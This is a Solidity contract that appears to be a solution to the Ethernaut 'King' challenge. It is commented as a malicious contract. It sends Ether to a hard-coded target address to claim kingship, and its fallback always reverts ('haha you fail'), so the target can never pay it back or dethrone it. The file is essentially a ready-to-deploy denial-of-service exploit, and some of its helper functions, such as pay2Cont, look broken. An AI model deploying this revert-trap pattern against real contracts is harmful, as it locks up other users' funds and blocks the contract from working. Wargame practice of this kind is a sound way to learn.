
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//import "https://github.com/OpenZeppelin/zeppelin-solidity/contracts/access/Ownable.sol";
//import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract BadKing {
    
    address payable public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }


    // Create a malicious contract and seed it with some Ethers
    function BadKing1() public payable {
        require(msg.value  > 0);
    }

    // Create a malicious contract and seed it with some Ethers
    constructor()  payable {
        //require(msg.value > 1000000000000000, "Not enough fund to be king");
        owner = payable(msg.sender);

    }

    function pay2Cont() public payable onlyOwner {
        payable(address(this)).transfer(msg.value);
    }
 
    
    // This should trigger King fallback(), making this contract the king
    function becomeKing() public payable {  
        (bool success, ) = payable(address(0xbB2557b8e60b13b83eAb56951ffF5F9AB89293A0)).call{value: 2000000000000000, gas: 95500}("");
        require(success);
    }
    
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function close() public onlyOwner {
        //recommended: emit an event as well
        selfdestruct(payable(address(0x60B07E6D315ed45265152e4982bb3680F515256a)));
    }

    // in order to accept eth by contract
    function Zreceive() external payable {
        require(msg.value  > 0);
        
        (bool success, ) = payable(address(0xbB2557b8e60b13b83eAb56951ffF5F9AB89293A0)).call{value: msg.value, gas: 95500}("");
        require(success);
    }

    // This function fails "king.transfer" trx from Ethernaut
    fallback() external payable {
        revert("haha you fail");
    }

}
